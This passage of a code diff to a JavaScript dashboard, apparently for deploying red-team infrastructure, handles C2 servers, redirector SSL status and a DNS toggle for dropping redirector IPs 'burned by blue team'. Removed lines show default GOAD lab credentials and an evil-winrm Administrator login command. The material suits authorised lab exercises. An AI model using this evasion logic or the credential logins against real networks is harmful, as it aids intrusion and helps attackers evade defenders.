+                    ? 'Toggle OFF to remove this IP from DNS (if burned by blue team)'
+                    : 'Toggle ON to re-add this IP to DNS'}
+            </p>
         </div>
-        ${bastion.rdp_connection ? `
-        <div style="margin-top: 15px; background: var(--bg-card); padding: 15px; border-radius: 5px;">
-            <strong>RDP Connection:</strong><br>
-            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px; border-radius: 3px; display: block; margin-top: 5px; overflow-x: auto;">${bastion.rdp_connection}</code>
+    `;
+
+    return `
+        <div style="padding: 12px; background: ${cfg.bg}; border-radius: 8px; border-left: 4px solid ${cfg.border};">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <strong style="color: ${cfg.color};">🔀 ${redir.name}</strong>
+                <code class="code-inline" style="font-size: 0.85em;">${redir.ip}</code>
+            </div>
+            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
+                <span style="font-size: 1.3em;">${cfg.icon}</span>
+                <strong style="font-size: 1.05em; color: ${cfg.color};">${cfg.label}</strong>
+            </div>
+            ${details ? `<div style="display: grid; gap: 4px; font-size: 0.9em; color: var(--text-primary); margin-bottom: 6px;">${details}</div>` : ''}
+            ${logHtml}
+            ${dnsToggleHtml}
         </div>
-        ` : ''}
-        ${bastion.wsl2_info ? `
-        <div style="margin-top: 15px; background: var(--warning-bg); padding: 15px; border-radius: 5px; border-left: 4px solid var(--warning);">
-            <strong>WSL2 Info:</strong><br>
-            <p style="margin-top: 5px; color: var(--text-secondary);">${bastion.wsl2_info}</p>
-        </div>
-        ` : ''}
     `;
 }
 
 /**
- * Populate C2 Servers section
+ * Auto-load SSL status — restores from cache if available, otherwise fetches fresh.
+ * Called when the deployment session card expands.
  */
-function populateC2ServersSection(c2Servers, deploymentMode) {
-    const section = document.getElementById('c2-servers-section');
-    const details = document.getElementById('c2-servers-details');
-    
-    const servers = c2Servers.servers || {};
-    const instanceIds = c2Servers.instance_ids || [];
-    const privateIps = c2Servers.private_ips || [];
-    
-    // Check if we have any servers
-    const hasServers = Object.keys(servers).length > 0 || instanceIds.length > 0;
-    
-    if (!hasServers) {
-        if (section) section.style.display = 'none';
-        return;
-    }
-    
-    section.style.display = 'block';
-    
-    let html = '<div style="display: grid; gap: 15px;">';
-    
-    if (Object.keys(servers).length > 0) {
-        // Phase-based or named servers
-        for (const [name, server] of Object.entries(servers)) {
-            html += `
-                <div style="background: var(--bg-card); padding: 15px; border-radius: 5px; border-left: 4px solid var(--danger);">
-                    <h4 style="margin: 0 0 10px 0; color: var(--danger-text);">${name}</h4>
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px;">
-                        <div>
-                            <strong>Instance ID:</strong><br>
-                            <code style="font-size: 0.88em;">${server.instance_id || 'N/A'}</code>
-                        </div>
-                        <div>
-                            <strong>Private IP:</strong><br>
-                            <code style="background: var(--bg-terminal); padding: 3px 8px; border-radius: 3px;">${server.private_ip || 'N/A'}</code>
-                        </div>
-                        ${server.phase ? `
-                        <div>
-                            <strong>Phase:</strong><br>
-                            <span style="background: var(--danger-bg); padding: 3px 8px; border-radius: 3px;">${server.phase}</span>
-                        </div>
-                        ` : ''}
-                    </div>
-                </div>
-            `;
-        }
-    } else {
-        // Simple list of servers
-        instanceIds.forEach((id, idx) => {
-            html += `
-                <div style="background: var(--bg-card); padding: 15px; border-radius: 5px; border-left: 4px solid var(--danger);">
-                    <h4 style="margin: 0 0 10px 0; color: var(--danger-text);">C2 Server ${idx + 1}</h4>
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px;">
-                        <div>
-                            <strong>Instance ID:</strong><br>
-                            <code style="font-size: 0.88em;">${id}</code>
-                        </div>
-                        <div>
-                            <strong>Private IP:</strong><br>
-                            <code style="background: var(--bg-terminal); padding: 3px 8px; border-radius: 3px;">${privateIps[idx] || 'N/A'}</code>
-                        </div>
-                    </div>
-                </div>
-            `;
-        });
-    }
-    
-    html += '</div>';
-    details.innerHTML = html;
-}
-
-/**
- * Populate Redirectors section
- */
-function populateRedirectorsSection(redirectors) {
-    const section = document.getElementById('redirectors-section');
-    const details = document.getElementById('redirectors-details');
-    
-    const instanceIds = redirectors.instance_ids || [];
-    const publicIps = redirectors.public_ips || [];
-    const privateIps = redirectors.private_ips || [];
-    
-    if (instanceIds.length === 0) {
-        if (section) section.style.display = 'none';
-        return;
-    }
-    
-    section.style.display = 'block';
-    
-    let html = '<div style="display: grid; gap: 15px;">';
-    
-    instanceIds.forEach((id, idx) => {
-        html += `
-            <div style="background: var(--bg-card); padding: 15px; border-radius: 5px; border-left: 4px solid var(--success);">
-                <h4 style="margin: 0 0 10px 0; color: var(--success-text);">Redirector ${idx + 1}</h4>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px;">
-                    <div>
-                        <strong>Instance ID:</strong><br>
-                        <code style="font-size: 0.88em;">${id}</code>
-                    </div>
-                    <div>
-                        <strong>Public IP:</strong><br>
-                        <code style="background: var(--success-bg); padding: 3px 8px; border-radius: 3px; color: var(--success-text);">${publicIps[idx] || 'N/A'}</code>
-                    </div>
-                    <div>
-                        <strong>Private IP:</strong><br>
-                        <code style="background: var(--bg-terminal); padding: 3px 8px; border-radius: 3px;">${privateIps[idx] || 'N/A'}</code>
-                    </div>
-                </div>
-            </div>
-        `;
-    });
-    
-    html += '</div>';
-    details.innerHTML = html;
-    
-    // Load SSL status for redirectors
-    loadSSLStatus(publicIps);
-}
-
-/**
- * Load SSL status for redirectors
- */
-async function loadSSLStatus(redirectorIps) {
+async function autoLoadSSLStatus() {
     const sslContent = document.getElementById('ssl-status-content');
     if (!sslContent) return;
-    
-    if (!redirectorIps || redirectorIps.length === 0) {
-        sslContent.innerHTML = '<p style="color: var(--text-secondary);">No redirectors deployed</p>';
+
+    // Resolve current project and restore its cache
+    const projectName = document.getElementById('aws-project-tag')?.textContent?.trim()
+        || document.querySelector('[data-project-name]')?.dataset.projectName
+        || '';
+    _restoreSSLCache(projectName);
+
+    // If we have cached data for THIS project, restore it instantly
+    if (cachedSSLStatusData) {
+        sslContent.innerHTML = cachedSSLStatusData;
+        updateSSLTimestamp();
+        sslContent.removeAttribute('data-needs-load');
         return;
     }
-    
-    // For now, show status based on config (actual status would require SSM or API call to redirector)
-    try {
-        const configResponse = await fetch(`${API_BASE}/config/`);
-        const configData = await configResponse.json();
-        
-        if (!configData.success) {
-            sslContent.innerHTML = '<p style="color: var(--text-secondary);">Unable to load SSL configuration</p>';
-            return;
-        }
-        
-        const config = configData.config || {};
-        const sslProvider = config.ssl_provider || 'letsencrypt';
-        const adminEmail = config.admin_email || '';
-        const sslAutoRetry = config.ssl_auto_retry !== false;
-        const enableSsl = config.enable_ssl_certificate !== false;
-        
-        if (!enableSsl) {
-            sslContent.innerHTML = `
-                <div style="display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--warning-bg); border-radius: 6px;">
-                    <span style="font-size: 1.5em;">⚠️</span>
-                    <div>
-                        <strong style="color: var(--warning-text);">SSL Disabled</strong>
-                        <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">HTTPS is not configured on redirectors</p>
-                    </div>
-                </div>
-            `;
-            return;
-        }
-        
-        let statusHtml = '';
-        
-        if (sslProvider === 'letsencrypt') {
-            statusHtml = `
-                <div style="display: grid; gap: 15px;">
-                    <div style="display: flex; align-items: center; gap: 10px; padding: 12px; background: var(--info-bg); border-radius: 6px;">
-                        <span style="font-size: 1.5em;">🔒</span>
-                        <div>
-                            <strong style="color: var(--info-text);">Let's Encrypt</strong>
-                            <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">
-                                Auto-renewal enabled • Notifications to: ${adminEmail || 'Not set'}
-                            </p>
-                        </div>
-                    </div>
-                    
-                    <div style="font-size: 0.9em;">
-                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
-                            <div style="padding: 10px; background: var(--bg-container); border-radius: 4px;">
-                                <strong>Auto-Retry:</strong> ${sslAutoRetry ? '✅ Enabled' : '❌ Disabled'}
-                            </div>
-                            <div style="padding: 10px; background: var(--bg-container); border-radius: 4px;">
-                                <strong>Certificate Validity:</strong> 90 days
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div style="padding: 12px; background: var(--warning-bg); border-radius: 6px; font-size: 0.88em;">
-                        <strong>📋 Certificate Status Check:</strong>
-                        <p style="margin: 8px 0 0 0; color: var(--text-secondary);">
-                            SSH into a redirector and run: <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">cat /opt/ssl-status.json</code>
-                        </p>
-                        <p style="margin: 5px 0 0 0; color: var(--text-secondary);">
-                            Or check logs: <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">tail -f /var/log/ssl-auto-request.log</code>
-                        </p>
-                    </div>
-                </div>
-            `;
-        } else {
-            statusHtml = `
-                <div style="display: flex; align-items: center; gap: 10px; padding: 12px; background: var(--warning-bg); border-radius: 6px;">
-                    <span style="font-size: 1.5em;">⚠️</span>
-                    <div>
-                        <strong style="color: var(--warning-text);">Self-Signed Certificate</strong>
-                        <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">
-                            Browsers will show security warnings. Consider switching to Let's Encrypt.
-                        </p>
-                    </div>
-                </div>
-            `;
-        }
-        
-        sslContent.innerHTML = statusHtml;
-        
-    } catch (error) {
-        console.error('Error loading SSL status:', error);
-        sslContent.innerHTML = '<p style="color: var(--danger-text);">Error loading SSL status</p>';
-    }
+
+    // No cache for this project — fetch fresh
+    sslContent.removeAttribute('data-needs-load');
+    await refreshSSLStatus();
 }
 
 /**
- * Refresh SSL status
+ * Refresh SSL status — SSH into redirectors again (always fetches fresh, ignores cache)
  */
 async function refreshSSLStatus() {
     const sslContent = document.getElementById('ssl-status-content');
     if (sslContent) {
-        sslContent.innerHTML = '<p style="color: var(--text-secondary); font-style: italic;">Refreshing...</p>';
+        sslContent.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 10px; padding: 12px; background: var(--bg-container); border-radius: 6px;">
+                <div class="spinner" style="width: 20px; height: 20px;"></div>
+                <div>
+                    <strong class="t-primary">Re-connecting to redirector(s) via SSH...</strong>
+                    <p style="margin: 4px 0 0 0; font-size: 0.88em; color: var(--text-secondary);">
+                        Fetching latest certificate status
+                    </p>
+                </div>
+            </div>
+        `;
     }
-    
-    // Get redirector IPs from the page
-    const redirectorDetails = document.getElementById('redirectors-details');
-    if (redirectorDetails) {
-        const ipMatches = redirectorDetails.innerHTML.match(/\d+\.\d+\.\d+\.\d+/g) || [];
-        await loadSSLStatus(ipMatches);
+
+    // The backend discovers redirectors automatically — just call loadSSLStatus
+    await loadSSLStatus();
+}
+
+/**
+ * Toggle a redirector's IP in/out of the Route53 DNS A record.
+ * Used when blue team burns a redirector IP — operator disables it so beacons
+ * only resolve to the remaining healthy redirector(s).
+ */
+async function toggleRedirectorDNS(ip, enabled) {
+    const toggleId = `dns-toggle-${ip.replace(/\./g, '-')}`;
+    const label = document.getElementById(`${toggleId}-label`);
+    const checkbox = document.getElementById(toggleId);
+
+    // Show loading state
+    if (label) {
+        label.textContent = enabled ? 'Enabling...' : 'Disabling...';
+        label.style.background = 'var(--warning-bg)';
+        label.style.color = 'var(--warning-text)';
+    }
+
+    try {
+        const projectName = document.getElementById('aws-project-tag')?.textContent?.trim()
+            || document.querySelector('[data-project-name]')?.dataset?.projectName
+            || document.getElementById('project-name')?.value?.trim()
+            || '';
+
+        const response = await fetch(`${API_BASE}/deploy/toggle-redirector`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ ip, enabled, project: projectName })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+            // Update label
+            if (label) {
+                label.textContent = enabled ? 'Active in DNS' : 'Removed from DNS';
+                label.style.background = enabled ? 'var(--success-bg)' : 'var(--danger-bg)';
+                label.style.color = enabled ? 'var(--success-text)' : 'var(--danger-text)';
+            }
+
+            // Show confirmation
+            const ttlNote = data.ttl ? ` DNS TTL: ${data.ttl}s` : '';
+            const activeList = (data.active_ips || []).join(', ');
+            showMessage(
+                `${enabled ? 'Enabled' : 'Disabled'} redirector ${ip}. Active IPs: ${activeList}.${ttlNote}`,
+                enabled ? 'success' : 'warning'
+            );
+        } else {
+            // Revert toggle
+            if (checkbox) checkbox.checked = !enabled;
+            if (label) {
+                label.textContent = !enabled ? 'Active in DNS' : 'Removed from DNS';
+                label.style.background = !enabled ? 'var(--success-bg)' : 'var(--danger-bg)';
+                label.style.color = !enabled ? 'var(--success-text)' : 'var(--danger-text)';
+            }
+            showMessage(data.error || 'Failed to toggle redirector', 'error');
+        }
+    } catch (err) {
+        // Revert toggle on error
+        if (checkbox) checkbox.checked = !enabled;
+        if (label) {
+            label.textContent = !enabled ? 'Active in DNS' : 'Removed from DNS';
+            label.style.background = !enabled ? 'var(--success-bg)' : 'var(--danger-bg)';
+            label.style.color = !enabled ? 'var(--success-text)' : 'var(--danger-text)';
+        }
+        showMessage(`Error: ${err.message}`, 'error');
     }
 }
 
@@ -9464,12 +16502,14 @@ async function refreshSSLStatus() {
 function populateNetworkSection(network, securityGroups) {
     const section = document.getElementById('network-section');
     const details = document.getElementById('network-details');
-    
+
+    if (!section) return;
+
     if (!network || !network.vpc_id) {
-        if (section) section.style.display = 'none';
+        section.style.display = 'none';
         return;
     }
-    
+
     section.style.display = 'block';
     
     details.innerHTML = `
@@ -9480,7 +16520,7 @@ function populateNetworkSection(network, securityGroups) {
             </div>
             <div style="background: var(--bg-card); padding: 15px; border-radius: 5px;">
                 <strong>VPC CIDR:</strong><br>
-                <code style="background: var(--bg-terminal); padding: 3px 8px; border-radius: 3px;">${network.vpc_cidr || 'N/A'}</code>
+                <code class="code-inline">${network.vpc_cidr || 'N/A'}</code>
             </div>
         </div>
         
@@ -9511,359 +16551,27 @@ function populateNetworkSection(network, securityGroups) {
     `;
 }
 
-/**
- * Populate connection info section
- */
-async function populateConnectionInfo(data) {
-    const section = document.getElementById('connection-info-section');
-    const commands = document.getElementById('connection-commands');
-    
-    if (!data.has_deployment) {
-        section.style.display = 'none';
-        return;
-    }
-    
-    section.style.display = 'block';
-    
-    // Get the configured key pair name from config
-    let keyPairName = 'your-key';
-    try {
-        const configResponse = await fetch(`${API_BASE}/config/`);
-        const configData = await configResponse.json();
-        if (configData.success && configData.config?.key_pair_name) {
-            keyPairName = configData.config.key_pair_name;
-        }
-    } catch (e) {
-        console.log('Could not fetch key pair name from config');
-    }
-    
-    let html = '';
-    
-    // Bastion RDP command
-    if (data.bastion && data.bastion.public_ip) {
-        html += `
-            <div style="margin-bottom: 20px;">
-                <h4 style="margin: 0 0 10px 0;">🖥️ Connect to Bastion (RDP)</h4>
-                <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px 15px; border-radius: 5px; display: block; overflow-x: auto;">
-                    mstsc /v:${data.bastion.public_ip}
-                </code>
-                <p style="color: var(--text-secondary); font-size: 0.88em; margin-top: 8px;">
-                    Username: <code>Administrator</code> | Get password from AWS Console using your key pair
-                </p>
-            </div>
-        `;
-    }
-    
-    // SSH to C2 servers via bastion
-    const c2Ips = data.c2_servers?.private_ips || [];
-    if (c2Ips.length > 0 && data.bastion?.public_ip) {
-        html += `
-            <div style="margin-bottom: 20px;">
-                <h4 style="margin: 0 0 10px 0;">🎯 SSH to C2 Servers (via Bastion WSL2)</h4>
-                <p style="color: var(--text-secondary); font-size: 0.9em; margin-bottom: 10px;">
-                    Connect through the Windows Bastion's WSL2 environment.
-                </p>
-                ${c2Ips.map((ip, idx) => `
-                    <div style="margin-bottom: 10px;">
-                        <span style="color: var(--text-secondary);">C2 Server ${idx + 1}:</span>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px 15px; border-radius: 5px; display: block; margin-top: 5px; overflow-x: auto;">
-                            ssh -i ~/.ssh/${keyPairName}.pem ubuntu@${ip}
-                        </code>
-                    </div>
-                `).join('')}
-            </div>
-        `;
-    }
-    
-    // Direct SSH to redirectors
-    const redirectorIps = data.redirectors?.public_ips || [];
-    if (redirectorIps.length > 0) {
-        html += `
-            <div style="margin-bottom: 20px;">
-                <h4 style="margin: 0 0 10px 0;">🔀 SSH to Redirectors</h4>
-                <p style="color: var(--text-secondary); font-size: 0.9em; margin-bottom: 10px;">
-                    Direct SSH access. Redirectors run Ubuntu.
-                </p>
-                ${redirectorIps.map((ip, idx) => `
-                    <div style="margin-bottom: 10px;">
-                        <span style="color: var(--text-secondary);">Redirector ${idx + 1}:</span>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px 15px; border-radius: 5px; display: block; margin-top: 5px; overflow-x: auto;">
-                            ssh -i ~/.ssh/${keyPairName}.pem ubuntu@${ip}
-                        </code>
-                    </div>
-                `).join('')}
-                
-                <details style="margin-top: 15px;">
-                    <summary style="cursor: pointer; color: var(--info-text); font-weight: 500;">
-                        📋 Common Redirector Commands
-                    </summary>
-                    <div style="margin-top: 10px; padding: 15px; background: var(--bg-container); border-radius: 5px; font-size: 0.9em;">
-                        <p style="margin: 0 0 10px 0;"><strong>Check SSL Status:</strong></p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">cat /opt/ssl-status.json</code>
-                        
-                        <p style="margin: 15px 0 10px 0;"><strong>View Nginx Config:</strong></p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">sudo cat /etc/nginx/sites-enabled/default</code>
-                        
-                        <p style="margin: 15px 0 10px 0;"><strong>Edit Nginx (for URI changes):</strong></p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">sudo nano /etc/nginx/sites-enabled/default</code>
-                        
-                        <p style="margin: 15px 0 10px 0;"><strong>Reload Nginx After Changes:</strong></p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">sudo nginx -t && sudo systemctl reload nginx</code>
-                        
-                        <p style="margin: 15px 0 10px 0;"><strong>View Access Logs:</strong></p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">sudo tail -f /var/log/nginx/access.log</code>
-                        
-                        <p style="margin: 15px 0 10px 0;"><strong>Manual Let's Encrypt Request:</strong></p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">sudo certbot --nginx -d yourdomain.com</code>
-                    </div>
-                </details>
-            </div>
-        `;
-    }
-    
-    // GOAD Jumpbox (fetch from GOAD API)
-    try {
-        const goadResponse = await fetch(`${API_BASE}/goad/jumpbox`);
-        const goadData = await goadResponse.json();
-        
-        if (goadData.success && goadData.jumpbox) {
-            const jb = goadData.jumpbox;
-            
-            // Also fetch credentials
-            let credsHtml = '';
-            try {
-                const credsResponse = await fetch(`${API_BASE}/goad/credentials`);
-                const credsData = await credsResponse.json();
-                
-                if (credsData.success && credsData.credentials) {
-                    const creds = credsData.credentials;
-                    credsHtml = `
-                        <details style="margin-top: 15px;">
-                            <summary style="cursor: pointer; color: var(--danger-text); font-weight: 500;">
-                                🔑 GOAD Default Credentials
-                            </summary>
-                            <div style="margin-top: 10px; padding: 15px; background: var(--danger-bg); border-radius: 5px; font-size: 0.9em;">
-                                <p style="margin: 0 0 15px 0; color: var(--danger-text);">
-                                    <strong>⚠️ Intentionally Vulnerable:</strong> These are default GOAD credentials for the <strong>${creds.lab_display_name || creds.lab_name}</strong> lab.
-                                </p>
-                                
-                                <div style="background: var(--bg-card); padding: 12px; border-radius: 5px; margin-bottom: 10px;">
-                                    <p style="margin: 0 0 8px 0;"><strong>Default Password (All Users):</strong></p>
-                                    <code style="background: var(--bg-terminal); color: var(--danger-text); padding: 8px 15px; border-radius: 4px; display: inline-block; font-size: 1.1em;">
-                                        ${creds.default_password || 'vagrant'}
-                                    </code>
-                                </div>
-                                
-                                ${creds.domains && creds.domains.length > 0 ? `
-                                    <p style="margin: 15px 0 10px 0;"><strong>Domains in this Lab:</strong></p>
-                                    <table style="width: 100%; border-collapse: collapse; font-size: 0.9em; margin-bottom: 15px;">
-                                        <thead>
-                                            <tr style="background: var(--info-bg);">
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Domain</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">FQDN</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">DC</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            ${creds.domains.map(d => `
-                                                <tr>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);"><strong>${d.name}</strong></td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);"><code>${d.fqdn}</code></td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);">${d.dc}</td>
-                                                </tr>
-                                            `).join('')}
-                                        </tbody>
-                                    </table>
-                                ` : ''}
-                                
-                                ${creds.domain_admins && creds.domain_admins.length > 0 ? `
-                                    <p style="margin: 15px 0 10px 0;"><strong>Domain Administrators:</strong></p>
-                                    <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
-                                        <thead>
-                                            <tr style="background: var(--bg-container);">
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Domain</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Username</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Password</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            ${creds.domain_admins.map(admin => `
-                                                <tr>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);">${admin.domain}</td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);"><code>${admin.username}</code></td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);"><code style="color: var(--danger-text);">${admin.password}</code></td>
-                                                </tr>
-                                            `).join('')}
-                                        </tbody>
-                                    </table>
-                                ` : ''}
-                                
-                                ${creds.key_users && creds.key_users.length > 0 ? `
-                                    <p style="margin: 15px 0 10px 0;"><strong>Key Domain Users:</strong></p>
-                                    <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
-                                        <thead>
-                                            <tr style="background: var(--warning-bg);">
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Domain</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Username</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Password</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Role</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            ${creds.key_users.map(user => `
-                                                <tr>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);">${user.domain}</td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);"><code>${user.username}</code></td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);"><code style="color: var(--danger-text);">${user.password}</code></td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border); font-size: 0.88em;">${user.role}</td>
-                                                </tr>
-                                            `).join('')}
-                                        </tbody>
-                                    </table>
-                                ` : ''}
-                                
-                                ${creds.trusts && creds.trusts.length > 0 ? `
-                                    <p style="margin: 15px 0 10px 0;"><strong>Domain Trusts:</strong></p>
-                                    <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
-                                        <thead>
-                                            <tr style="background: var(--bg-section);">
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">From</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">To</th>
-                                                <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Type</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            ${creds.trusts.map(trust => `
-                                                <tr>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);">${trust.from}</td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);">${trust.to}</td>
-                                                    <td style="padding: 8px; border: 1px solid var(--border);">${trust.type}</td>
-                                                </tr>
-                                            `).join('')}
-                                        </tbody>
-                                    </table>
-                                ` : ''}
-                                
-                                ${creds.special_accounts && creds.special_accounts.length > 0 ? `
-                                    <p style="margin: 15px 0 10px 0;"><strong>Special Accounts (Lab-Specific):</strong></p>
-                                    <div style="background: var(--warning-bg); padding: 10px; border-radius: 5px;">
-                                        ${creds.special_accounts.map(acc => `
-                                            <p style="margin: 5px 0;"><strong>${acc.name}:</strong> ${acc.note}</p>
-                                        `).join('')}
-                                    </div>
-                                ` : ''}
-                                
-                                <p style="margin: 15px 0 10px 0;"><strong>Local Accounts (All VMs):</strong></p>
-                                <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
-                                    <thead>
-                                        <tr style="background: var(--bg-container);">
-                                            <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Account</th>
-                                            <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Username</th>
-                                            <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Password</th>
-                                        </tr>
-                                    </thead>
-                                    <tbody>
-                                        <tr>
-                                            <td style="padding: 8px; border: 1px solid var(--border);">Local Admin</td>
-                                            <td style="padding: 8px; border: 1px solid var(--border);"><code>Administrator</code></td>
-                                            <td style="padding: 8px; border: 1px solid var(--border);"><code style="color: var(--danger-text);">vagrant</code></td>
-                                        </tr>
-                                        <tr>
-                                            <td style="padding: 8px; border: 1px solid var(--border);">Vagrant User</td>
-                                            <td style="padding: 8px; border: 1px solid var(--border);"><code>vagrant</code></td>
-                                            <td style="padding: 8px; border: 1px solid var(--border);"><code style="color: var(--danger-text);">vagrant</code></td>
-                                        </tr>
-                                    </tbody>
-                                </table>
-                                
-                                <p style="margin: 15px 0 0 0; font-size: 0.88em; color: var(--text-secondary);">
-                                    📁 Full inventory: <code>${creds.inventory_path || '/opt/goad/ad/&lt;lab&gt;/data/inventory'}</code>
-                                </p>
-                            </div>
-                        </details>
-                    `;
-                }
-            } catch (e) {
-                console.log('Could not fetch GOAD credentials');
-            }
-            
-            html += `
-                <div style="margin-bottom: 20px;">
-                    <h4 style="margin: 0 0 10px 0;">🎮 GOAD Jumpbox (Ubuntu)</h4>
-                    <p style="color: var(--text-secondary); font-size: 0.9em; margin-bottom: 10px;">
-                        Access the GOAD lab management server. Lab: <strong>${jb.lab_name || 'GOAD'}</strong>
-                    </p>
-                    
-                    ${jb.public_ip ? `
-                        <div style="margin-bottom: 10px;">
-                            <span style="color: var(--text-secondary);">SSH Access (use your own private key):</span>
-                            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px 15px; border-radius: 5px; display: block; margin-top: 5px; overflow-x: auto;">
-                                ${jb.commands?.ssh || `ssh -i ~/.ssh/your_key ubuntu@${jb.public_ip}`}
-                            </code>
-                        </div>
-                        
-                        <div style="margin-bottom: 10px;">
-                            <span style="color: var(--text-secondary);">SOCKS Proxy (for accessing AD network):</span>
-                            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px 15px; border-radius: 5px; display: block; margin-top: 5px; overflow-x: auto;">
-                                ${jb.commands?.socks_proxy || `ssh -D 1080 -i ~/.ssh/your_key ubuntu@${jb.public_ip}`}
-                            </code>
-                        </div>
-                        
-                        <div style="margin-top: 8px; padding: 8px; background: var(--success-bg); border-radius: 4px; font-size: 0.88em; color: var(--success-text);">
-                            💡 Replace <code>your_key</code> with your private key path (e.g., <code>~/.ssh/id_ed25519</code>)
-                        </div>
-                    ` : `
-                        <p style="color: var(--warning-text);">⚠️ Jumpbox IP not available yet. The lab may still be deploying.</p>
-                    `}
-                    
-                    ${credsHtml}
-                    
-                    <details style="margin-top: 15px;">
-                        <summary style="cursor: pointer; color: var(--info-text); font-weight: 500;">
-                            📋 Common GOAD Commands
-                        </summary>
-                        <div style="margin-top: 10px; padding: 15px; background: var(--bg-container); border-radius: 5px; font-size: 0.9em;">
-                            <p style="margin: 0 0 10px 0;"><strong>Check Lab Status:</strong></p>
-                            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">cd /opt/goad && ./goad.sh -t check -l GOAD -p aws</code>
-                            
-                            <p style="margin: 15px 0 10px 0;"><strong>Run Ansible Provisioning:</strong></p>
-                            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">cd /opt/goad && ./goad.sh -t install -l GOAD -p aws</code>
-                            
-                            <p style="margin: 15px 0 10px 0;"><strong>View Ansible Inventory:</strong></p>
-                            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">cat /opt/goad/ad/GOAD/providers/aws/inventory</code>
-                            
-                            <p style="margin: 15px 0 10px 0;"><strong>Test WinRM to DC:</strong></p>
-                            <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block;">evil-winrm -i DC_IP -u Administrator -p 'vagrant'</code>
-                        </div>
-                    </details>
-                </div>
-            `;
-        }
-    } catch (e) {
-        console.log('No GOAD jumpbox info available');
-    }
-    
-    if (!html) {
-        html = '<p style="color: var(--text-muted);">No connection information available.</p>';
-    }
-    
-    commands.innerHTML = html;
-}
-
 // ============================================================================
 // UTILITY FUNCTIONS
 // ============================================================================
 
+let _messageTimeout = null;
 function showMessage(message, type) {
     const messageDiv = document.getElementById('config-message');
     if (!messageDiv) return;
-    
+
+    // Clear any pending hide timeout
+    if (_messageTimeout) clearTimeout(_messageTimeout);
+
     messageDiv.textContent = message;
     messageDiv.className = `message ${type} show`;
-    
-    setTimeout(() => {
+
